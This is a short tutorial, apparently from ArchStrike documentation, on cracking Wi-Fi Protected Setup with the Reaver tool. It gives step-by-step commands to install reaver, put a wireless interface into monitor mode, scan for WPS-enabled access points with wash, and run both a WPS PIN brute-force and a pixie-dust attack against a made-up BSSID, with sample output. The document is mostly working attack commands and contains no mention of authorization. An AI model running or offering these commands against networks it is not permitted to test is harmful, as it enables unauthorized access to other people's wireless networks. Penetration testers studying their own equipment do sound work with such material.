## Cracking WPS with Reaver

This tutorial will explain some attacks on the WPS protocol using the Reaver tool.

First let's install Reaver. We will be installing the ArchStrike version to have Pixie Dust attacking capabilities built into Reaver.

```
# pacman -S reaver-wps-fork-t6x-git
```

You can download the community reaver instead, but that one misses the pixie dust attack.

After installing reaver, we must enable the monitor mode on one of our wireless interfaces.


To see our wireless interfaces:

```
# iwconfig

wlp3s0      IEEE 802.11 ESSID:"ArchStrike"
            Mode:Managed Frequency:2.437 GHz  Access Point: XX:XX:XX:XX:XX:XX
            Bit Rate=72.2 Mb/s   Tx-Power=20 dBm   
            Retry short limit:7   RTS thr=2347 B   Fragment thr:off
            Power Management:off
            Link Quality=70/70  Signal level=-36 dBm  
            Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
            Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```

**NOTE**: Keep in mind that your interface name might be different.

And now we can enable the monitor mode.

```
# airmon-ng start wlp3s0

PHY Interface   Driver      Chipset

phy0    wlp3s0  something   something


(mac80211 monitor mode vif enabled for [phy0]wlp3s0 on [phy0]wlp3s0mon)
(mac80211 station mode vif disabled for [phy0]wlp3s0)
```

And now we can check again to see if it worked.

```
# iwconfig

wlp3s0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
           Retry short limit:7   RTS thr=2347 B   Fragment thr:off
           Power Management:on
```

It did. Now, we will use the `wash` tool that comes with reaver to explore the access points around us.

```
# wash -i wlp3s0mon

BSSID              Channel  RSSI  WPS Version  WPS Locked  ESSID
--------------------------------------------------------------------------------------
11:22:33:44:55:66  1        x     1.0          No          Crack_Me

```

We will be targeting `Crack_Me`. Let's note down the BSSID info which is `11:22:33:44:55:66` (I made it up for the tutorial).

Now we can run reaver on the access point since we established it's using WPS.

```
# reaver -i wlp3s0mon -b 11:22:33:44:55:66 -vvv
```

That will do a default brute-force attack on the WPS pin. However, newer access points will lock WPS after a number of attempts. So instead of a pin brute-force, we can try a pixie dust attack which takes shorter (however it is not guaranteed to work).

```
# reaver -i wlp3s0mon -b 11:22:33:44:55:66 -vvv -K 1
```

This will run the attack and it will show you the success/fail message in the end.

Feel free to explore the more advanced options of reaver by checking `reaver -h`.
